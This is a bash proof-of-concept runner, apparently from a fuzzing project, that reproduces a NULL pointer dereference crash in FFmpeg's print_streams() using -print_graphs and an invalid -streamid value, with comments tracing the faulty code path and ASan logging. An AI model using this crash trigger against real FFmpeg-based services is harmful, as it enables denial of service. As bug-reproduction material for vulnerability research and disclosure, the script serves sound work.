#!/bin/bash
# vuln_002_run.sh - PoC runner for VULN 002: NULL Pointer Dereference in print_streams()
#
# Trigger path:
#   ffmpeg -print_graphs 1 -i input.wav -streamid 0:abc -f wav /dev/null
#   -> ffmpeg_cleanup() -> print_filtergraphs() -> print_filtergraphs_priv()
#   -> print_streams() -> ost->st->codecpar->codec_id (NULL deref at graphprint.c:782)
#
# Why it triggers:
#   1. -streamid 0:abc causes new_output_stream() to fail AFTER mux_stream_alloc()
#      increments of->nb_streams but BEFORE ost->st = st (line 1201 in ffmpeg_mux_init.c).
#   2. mux->fc is set BEFORE create_streams() is called, so the !muxer->fc guard
#      in print_streams() is bypassed.
#   3. print_streams() OUTPUTSTREAMS block (lines 780-782) has no NULL guard for ost->st,
#      unlike the ENCODERS block (line 716) which has: if (!ost || !ost->st || ...) continue;
#
# The ONLY valid binary: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating input file..."
python3 vuln_002_gen.py

echo "[*] Running ffmpeg with -print_graphs and invalid -streamid to trigger NULL deref..."
# Note: -print_graphs is OPT_TYPE_BOOL (no argument), so do NOT pass '1' after it.
# -streamid 0:abc sets an invalid (non-numeric) stream ID for output stream 0.
# This makes new_output_stream() call mux_stream_alloc() (increments nb_streams)
# and then return AVERROR(EINVAL) BEFORE setting ost->st = st (line 1201).
# avformat_alloc_output_context2 succeeds first (mux->fc is set), so the
# !muxer->fc guard in print_streams() is bypassed. Then print_streams() hits
# the NULL dereference at line 782: ost->st->codecpar->codec_id (ost->st = NULL).
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_002.log" \
  "$BIN" \
    -print_graphs \
    -i vuln_002_input.wav \
    -streamid 0:abc \
    -f wav /dev/null \
  > vuln_002_result.txt 2>&1 || true

echo "[*] Appending any ASAN output..."
cat asan_002.log.* >> vuln_002_result.txt 2>/dev/null || true

echo "[*] Done. Output in vuln_002_result.txt"
